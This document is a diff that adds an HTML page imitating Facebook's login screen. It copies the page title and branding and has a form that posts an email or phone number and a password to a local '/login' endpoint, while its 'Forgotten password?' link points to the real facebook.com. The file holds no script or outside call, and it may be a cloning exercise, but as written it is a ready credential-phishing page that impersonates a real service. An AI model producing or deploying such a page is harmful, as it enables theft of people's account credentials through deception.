@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook – log in or sign up</title>
+</head>
+<body>
+
+    <!-- Main structural table to create a basic layout -->
+    <table width="100%" cellpadding="20" cellspacing="0">
+        <tr>
+            <!-- Left Side: Branding -->
+            <td width="50%" valign="top">
+                <!-- Facebook Text Logo (Using a styled header fallback since there is no CSS) -->
+                <h1 style="font-family: sans-serif; color: #1877f2; font-size: 4rem; margin-bottom: 0;">facebook</h1>
+                <h2>Recent Logins</h2>
+                <p>Click your picture or add an account.</p>
+                
+                <!-- Mock Recent Login Box -->
+                <table border="1" cellpadding="10" cellspacing="0" bgcolor="#f0f2f5">
+                    <tr>
+                        <td align="center">
+                            <font size="5"><b>+</b></font><br>
+                            <a href="#">Add Account</a>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+
+            <!-- Right Side: Login Card Box -->
+            <td width="50%" valign="top" align="center">
+                <br><br>
+                <!-- Form Box Boundary Container -->
+                <table border="1" cellpadding="20" cellspacing="0" bgcolor="#ffffff" width="360">
+                    <tr>
+                        <td>
+                            <form action="/login" method="POST">
+                                <table width="100%" cellpadding="10" cellspacing="0">
+                                    <!-- Email/Phone Input -->
+                                    <tr>
+                                        <td>
+                                            <input type="text" name="email" placeholder="Email address or phone number" required style="width: 95%; padding: 10px;">
+                                        </td>
+                                    </tr>
+                                    <!-- Password Input -->
+                                    <tr>
+                                        <td>
+                                            <input type="password" name="pass" placeholder="Password" required style="width: 95%; padding: 10px;">
+                                        </td>
+                                    </tr>
+                                    <!-- Log In Button -->
+                                    <tr>
+                                        <td align="center">
+                                            <button type="submit" style="width: 100%; padding: 10px; background-color: #1877f2; color: white; font-weight: bold; border: none;">Log In</button>
+                                        </td>
+                                    </tr>
+                                    <!-- Forgotten Password Link -->
+                                    <tr>
+                                        <td align="center">
+                                            <a href="https://facebook.com"><font size="2" color="#1877f2">Forgotten password?</font></a>
+                                        </td>
+                                    </tr>
+                                    <!-- Divider Line -->
+                                    <tr>
+                                        <td>
+                                            <hr>
+                                        </td>
+                                    </tr>
+                                    <!-- Create New Account Button -->
+                                    <tr>
+                                        <td align="center">
+                                            <button type="button" onclick="window.location.href='/r.php'" style="padding: 10px; background-color: #42b72a; color: white; font-weight: bold; border: none;">Create new account</button>
+                                        </td>
+                                    </tr>
+                                </table>
+                            </form>
+                        </td>
+                    </tr>
+                </table>
+                <br>
+                <p><font size="2"><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</font></p>
+            </td>
+        </tr>
+    </table>
+
+</body>
+</html>
